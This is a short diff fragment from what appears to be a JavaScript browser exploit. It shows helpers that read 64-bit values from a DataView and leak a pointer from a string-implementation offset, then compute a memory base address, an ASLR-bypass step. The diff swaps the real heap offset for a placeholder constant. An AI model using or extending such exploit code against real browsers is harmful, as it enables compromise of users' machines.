@@ -191,10 +191,12 @@ addEventListener('unhandledrejection', event => {
     const high = view.getUint32(offset + 4, true);
     return BigInt(low) + (BigInt(high) << 32n);
   }
+ 
   const leakPtr = read64(dv, off.strimpl_inline_str);
   log(`[+] Leaked pointer: ${hex(leakPtr)}`);
 
-  const KNOWN = BigInt(off.heap_slide);
+  //const KNOWN = BigInt(off.heap_slide);
+     const KNOWN =0x12345678n;
   const base = leakPtr - KNOWN;
   log(`[+] Computed base: ${hex(base)}`);
 
